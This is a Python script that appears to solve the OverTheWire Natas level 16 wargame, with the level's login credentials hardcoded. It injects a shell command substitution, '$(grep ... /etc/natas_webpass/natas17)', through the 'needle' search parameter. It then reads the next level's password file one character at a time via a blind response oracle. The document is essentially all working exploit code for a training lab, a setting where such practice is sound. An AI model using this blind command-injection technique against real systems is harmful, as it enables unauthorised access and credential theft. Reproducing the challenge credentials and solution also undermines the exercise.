import requests
from requests.auth import HTTPBasicAuth

user = "natas16"
pw = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"

# Empty container for our final password
hacc = ""

# Set of all alphanumeric characters
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
filtered = ""

for char in chars:
    exploit = {
        'needle': f'thumps$(grep {char} /etc/natas_webpass/natas17)'
    }
    r = requests.get('http://natas16.natas.labs.overthewire.org/', params=exploit, auth=HTTPBasicAuth(user, pw))
    if 'thumps' not in r.text:
        filtered += char
        print(filtered)

while (len(hacc) < 32):
    for char in filtered:
        exploit = {
            'needle': f'thumps$(grep ^{hacc + char} /etc/natas_webpass/natas17)'
        }
        r = requests.get('http://natas16.natas.labs.overthewire.org/', params=exploit, auth=HTTPBasicAuth(user, pw))

        if 'thumps' not in r.text:
            hacc += char
            print(hacc)
            break